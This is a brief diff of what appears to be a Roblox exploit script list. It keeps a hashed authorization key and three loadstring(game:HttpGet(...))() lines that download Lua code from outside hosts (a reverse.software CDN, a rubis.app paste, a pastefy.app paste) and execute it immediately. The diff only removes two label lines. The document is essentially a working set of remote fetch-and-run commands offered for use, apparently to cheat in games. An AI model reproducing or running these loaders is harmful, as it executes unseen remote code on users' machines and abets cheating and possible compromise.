@@ -1,6 +1,4 @@
 AUTHORIZATION_KEY="$2b$10$nSuDkx0peujxyFu9V7H1RuNRd7NgcOkVBfj5o4SMpZSZ./opzxavi";
 loadstring(game:HttpGet("https://cdn.reverse.software/auto-joiner.luau"))()
-X script...
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/XMebVM1hEvXKCzbG/raw", true))()
-Dark script...
 loadstring(game:HttpGet("https://pastefy.app/oJI5yVGJ/raw"))()
